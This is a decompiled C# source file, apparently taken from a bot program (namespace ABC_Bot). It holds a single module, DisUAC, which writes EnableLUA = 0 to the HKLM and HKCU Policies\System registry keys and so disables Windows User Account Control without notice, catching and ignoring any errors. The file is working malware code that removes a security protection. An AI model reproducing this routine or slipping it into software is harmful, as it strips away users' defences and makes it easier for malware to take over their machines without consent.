using System;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace ABC_Bot;

[StandardModule]
internal sealed class mod_uac
{
	public static object DisUAC()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		RegistryKey[] array = default(RegistryKey[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 228:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0012;
						case 4:
							goto IL_0028;
						case 5:
							goto IL_003e;
						case 6:
							goto IL_005c;
						case 7:
							goto IL_0072;
						case 8:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 9:
						case 10:
						case 11:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0072:
					num = 7;
					if (!Operators.ConditionalCompareObjectNotEqual(array[0].GetValue("EnableLUA"), (object)0, false))
					{
						goto end_IL_0000_3;
					}
					break;
					IL_005c:
					num = 6;
					array[1].SetValue("EnableLUA", 0);
					goto IL_0072;
					IL_0008:
					num = 2;
					array = new RegistryKey[2];
					goto IL_0012;
					IL_0012:
					num = 3;
					array[0] = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
					goto IL_0028;
					IL_0028:
					num = 4;
					array[1] = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
					goto IL_003e;
					IL_003e:
					num = 5;
					if (!Operators.ConditionalCompareObjectNotEqual(array[1].GetValue("EnableLUA"), (object)0, false))
					{
						goto end_IL_0000_3;
					}
					goto IL_005c;
					end_IL_0000_2:
					break;
				}
				num = 8;
				array[0].SetValue("EnableLUA", 0);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 228;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}
}
